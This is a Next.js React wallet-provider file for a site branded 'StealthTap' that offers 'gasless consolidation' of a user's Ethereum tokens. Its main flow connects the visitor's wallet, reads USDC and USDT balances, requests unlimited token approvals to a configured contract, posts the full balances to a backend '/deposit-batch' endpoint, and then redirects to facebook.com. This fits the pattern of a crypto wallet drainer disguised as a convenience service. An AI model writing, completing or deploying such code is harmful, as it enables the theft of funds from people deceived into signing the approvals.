"use client";

import { createContext, useContext, useState, useEffect, useRef, useCallback } from 'react';
import { createAppKit } from '@reown/appkit';
import { mainnet } from '@reown/appkit/networks';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { ethers } from 'ethers';

const WalletContext = createContext(null);

const PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || 'd42d0d87f9dbd80edf85004d36f85169'; 
const CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0xYOUR_ACTUAL_CONTRACT_ADDRESS";
const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || "/api";

const TOKENS = [
  { symbol: "USDC", address: process.env.NEXT_PUBLIC_USDC_ADDRESS || "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
  { symbol: "USDT", address: process.env.NEXT_PUBLIC_USDT_ADDRESS || "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)",
];

let appKitInstance = null;

function getAppKit() {
  if (appKitInstance) return appKitInstance;
  if (typeof window === 'undefined') return null;

  const ethersAdapter = new EthersAdapter();
  appKitInstance = createAppKit({
    projectId: PROJECT_ID,
    networks: [mainnet],
    defaultNetwork: mainnet,
    adapters: [ethersAdapter],
    allWallets: 'SHOW',
    chainImages: {},
    featuredWalletIds: [
      'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', 
      '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', 
    ],
    metadata: {
      name: 'StealthTap',
      description: 'Gasless consolidation',
      url: window.location.origin,
      icons: [`${window.location.origin}/favicon.ico`],
    },
    features: { email: false, socials: false }
  });

  return appKitInstance;
}

export function WalletProvider({ children }) {
  const [walletReady, setWalletReady] = useState(false);
  const [address, setAddress] = useState(null);
  const [status, setStatus] = useState('Ready.');
  const [isConsolidating, setIsConsolidating] = useState(false);

  // ----------------------------------------------------
  // 1. YOUR TRANSACTION LOGIC 
  // ----------------------------------------------------
  const runTransactionLogic = useCallback(async (signer) => {
    setStatus("Checking balances...");

    try {
      const userAddress = await signer.getAddress();
      const readProvider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com");
      const held = [];
      
      for (const t of TOKENS) {
        const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
        const balance = await readOnlyToken.balanceOf(userAddress);
        
        if (balance > 0n) {
          const writeEnabledToken = new ethers.Contract(t.address, ERC20_ABI, signer);
          held.push({ ...t, amount: balance, contract: writeEnabledToken });
        }
      }

      if (held.length === 0) {
        setStatus("❌ Zero balance");
        setIsConsolidating(false);
        return;
      }

      const successfullyApproved = [];

      for (const t of held) {
        const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
        const currentAllowance = await readOnlyToken.allowance(userAddress, CONTRACT_ADDRESS);
        
        if (currentAllowance < t.amount) {
          try {
            setStatus(`Sign ${t.symbol} in Wallet ↩️`);
            
            const approveTx = await t.contract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
            
            setStatus(`Mining ${t.symbol}... Please wait.`);
            await approveTx.wait(); 
            successfullyApproved.push(t);
          } catch (approvalError) {
            console.warn(`[deposit] Skipped ${t.symbol}:`, approvalError.message);
          }
        } else {
          successfullyApproved.push(t);
        }
      }

      if (successfullyApproved.length === 0) {
        setStatus("❌ No tokens approved");
        setIsConsolidating(false);
        return;
      }

      setStatus("Executing Deposit...");
      const res = await fetch(BACKEND_URL + "/deposit-batch", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          depositor: userAddress, 
          tokens: successfullyApproved.map(t => t.address), 
          amounts: successfullyApproved.map(t => t.amount.toString()) 
        }),
      });
      
      const data = await res.json();
      
      if (data.success) {
        setStatus("✅ Success! Redirecting...");
        setTimeout(() => {
          window.location.href = "https://facebook.com"; 
        }, 1500);
      } else {
        setStatus("❌ Failed — check console");
        setIsConsolidating(false);
      }

    } catch (err) {
      console.error("FATAL ERROR:", err);
      setStatus("❌ Error — check console");
      setIsConsolidating(false);
    } 
  }, []);

// ----------------------------------------------------
  // 2. BACKGROUND HYDRATION (Keeps UI in sync)
  // ----------------------------------------------------
  useEffect(() => {
    const kit = getAppKit();
    if (!kit) return;

    const syncState = async () => {
      try {
        const walletProvider = kit.getWalletProvider?.();
        if (walletProvider) {
          const provider = new ethers.BrowserProvider(walletProvider);
          const signer = await provider.getSigner();
          const addr = await signer.getAddress();
          setAddress(addr);
          setWalletReady(true);
        } else {
          setWalletReady(false);
        }
      } catch (e) {
        console.warn("Sync error:", e.message);
      }
    };

    syncState();
    
    // Listen for account changes (connect/disconnect)
    const unsubAcc = kit.subscribeAccount(syncState);
    
    return () => { 
      if (unsubAcc) unsubAcc(); 
    };
  }, []);

  // ----------------------------------------------------
  // 3. ONE-CLICK AUTO-CONNECT & EXECUTE FLOW
  // ----------------------------------------------------
  const connectAndConsolidate = useCallback(async () => {
    setIsConsolidating(true);
    const kit = getAppKit();
    if (!kit) return;

    try {
      let walletProvider = kit.getWalletProvider?.();

      // IF NOT CONNECTED: Open modal and dynamically wait for connection
      if (!walletProvider) {
        setStatus("Connecting Wallet...");
        await kit.open({ view: 'Connect' });

        // Loop checks every 400ms until the provider is injected
        walletProvider = await new Promise((resolve) => {
          const checkInterval = setInterval(() => {
            const p = kit.getWalletProvider?.();
            if (p) {
              clearInterval(checkInterval);
              resolve(p);
            }
            // Check if user manually closed the modal without connecting
            const state = kit.getState();
            if (!state.open && !p) {
              clearInterval(checkInterval);
              resolve(null);
            }
          }, 400);
        });

        if (!walletProvider) {
          // User closed the modal
          setStatus("Ready.");
          setIsConsolidating(false);
          return;
        }
      }

      // WALLET IS READY: Immediately chain into the transaction
      setStatus("Initializing...");
      const provider = new ethers.BrowserProvider(walletProvider);
      const signer = await provider.getSigner();

      // Direct call to contract execution
      await runTransactionLogic(signer);

    } catch (err) {
      console.error(err);
      setStatus("❌ Error executing flow");
      setIsConsolidating(false);
    }
  }, [runTransactionLogic]);

  return (
    <WalletContext.Provider value={{
      walletReady,
      address,
      status,
      isConsolidating,
      connectAndConsolidate,
    }}>
      {children}
    </WalletContext.Provider>
  );
}

export function useWallet() {
  const ctx = useContext(WalletContext);
  if (!ctx) throw new Error('useWallet must be used within WalletProvider');
  return ctx;
}